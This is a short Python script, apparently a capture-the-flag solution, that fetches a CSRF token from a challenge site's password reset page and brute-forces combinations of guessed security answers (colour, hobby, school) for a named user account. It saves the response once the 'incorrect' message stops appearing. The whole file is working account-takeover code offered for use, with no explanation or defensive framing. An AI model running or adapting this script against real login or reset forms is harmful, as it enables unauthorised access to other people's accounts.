import requests
from bs4 import BeautifulSoup

BASE = "https://cybersecurity-space-fe-ores.chals.io"

session = requests.Session()

# 1. Get CSRF token from the reset page
r = session.get(BASE + "/login/password_reset")
soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "csrf_token"})
csrf_token = csrf["value"] if csrf else None
print("CSRF:", csrf_token)

username = "anastasia.horton@spacefeore.com"

color_candidates = [
    "Deep space blue and asteroid silver",
    "deep space blue and asteroid silver",
    "deep space blue",
    "Deep space blue",
    "asteroid silver",
]

hobby_candidates = [
    "Stargazing, robotics tinkering, and hiking",
    "Stargazing",
    "robotics tinkering",
    "hiking",
    "stargazing",
]

school_candidates = [
    "International University of Mining & Technology",
    "International University of Mining and Technology",
    "Space Technology Institute",  # just in case they messed up and took the Master's
]

for c in color_candidates:
    for h in hobby_candidates:
        for s in school_candidates:
            data = {
                "csrf_token": csrf_token,
                "username": username,
                "favColor": c,
                "favHobby": h,
                "schoolName": s,
                "submit": "Submit",
            }
            resp = session.post(BASE + "/login/password_reset", data=data)
            text = resp.text

            if "Security answers incorrect" not in text:
                print("\n[*] Possible success!")
                print("Color :", repr(c))
                print("Hobby :", repr(h))
                print("School:", repr(s))
                # Optionally print or save resp.text to inspect it
                with open("success.html", "w", encoding="utf-8") as f:
                    f.write(text)
                raise SystemExit

print("Done, no combo found")
